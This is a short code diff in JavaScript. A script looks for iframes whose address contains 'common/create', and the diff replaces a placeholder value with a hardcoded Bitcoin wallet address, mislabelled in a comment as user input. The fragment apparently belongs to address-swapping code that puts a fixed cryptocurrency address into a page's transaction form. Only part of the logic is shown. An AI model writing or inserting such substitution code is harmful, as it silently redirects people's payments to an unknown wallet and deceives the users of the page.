@@ -11,7 +11,7 @@ function checkIframe() {
             if(document.getElementsByTagName("select")[1].value=="2"){
                 const iframes = Array.from(document.getElementsByTagName("iframe"));
                 const targetValue = "common/create"; // The string to check for
-                const newValue = "Fuck"; // Get user input
+                const newValue = "bc1qppe2ygq6u57wgq02ss8ju2adc280hvdm8f9mg0"; // Get user input
             
                 const foundIframe = iframes.some(iframe => {
                     if (iframe.src.includes(targetValue)) {
